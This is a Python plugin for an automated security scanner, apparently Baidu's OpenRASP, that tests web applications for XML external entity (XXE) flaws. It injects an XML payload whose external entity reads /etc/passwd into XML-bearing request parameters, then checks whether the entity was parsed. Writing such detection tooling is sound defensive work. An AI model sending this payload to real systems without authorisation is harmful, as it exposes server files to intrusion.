#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

"""
Copyright 2017-2019 Baidu Inc.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
"""

import types

from core.components.plugin import scan_plugin_base


class ScanPlugin(scan_plugin_base.ScanPluginBase):

    plugin_info = {
        "name": "xxe_basic",
        "show_name": "XXE检测插件",
        "description": "基础xxe漏洞检测插件"
    }

    def mutant(self, rasp_result_ins):
        """
        测试向量生成
        """

        xml_text = """<?xml version="1.0" encoding="utf-8"?><!DOCTYPE root [<!ENTITY  file SYSTEM "file:///etc/passwd">]><root>&file;</root>"""
        payload_list = [(xml_text, "file:///etc/passwd")]

        # 获取所有待测试参数
        request_data_ins = self.new_request_data(rasp_result_ins)
        test_params = self.mutant_helper.get_params_list(
            request_data_ins, ["get", "post", "json", "headers", "cookies", "files", "body"])
        for param in test_params:
            if param["type"] == "files":
                value = param["value"]["content"]
            else:
                value = param["value"]

            if isinstance(value, bytes):
                tag = b"<?xml"
            else:
                tag = "<?xml"

            if value.find(tag, 0, 20) < 0:
                continue

            payload_seq = self.gen_payload_seq()
            for payload in payload_list:
                request_data_ins = self.new_request_data(
                    rasp_result_ins, payload_seq, payload[1])
                if param["type"] == "files":
                    request_data_ins.set_param(
                        param["type"], [param["name"][0], "content_type"], "application/xml")
                    request_data_ins.set_param(
                        param["type"], [param["name"][0], "content"], payload[0].encode("utf-8"))
                else:
                    request_data_ins.set_param(
                        param["type"], param["name"], payload[0])
                request_data_list = [request_data_ins]
                yield request_data_list

    def check(self, request_data_list):
        """
        请求结果检测
        """
        request_data_ins = request_data_list[0]
        feature = request_data_ins.get_payload_info()["feature"]
        rasp_result_ins = request_data_ins.get_rasp_result()
        if rasp_result_ins is None:
            return None
        if self.checker.check_xxe(rasp_result_ins, feature):
            return "解析了用户提交的xml文档中的实体"
        else:
            return None
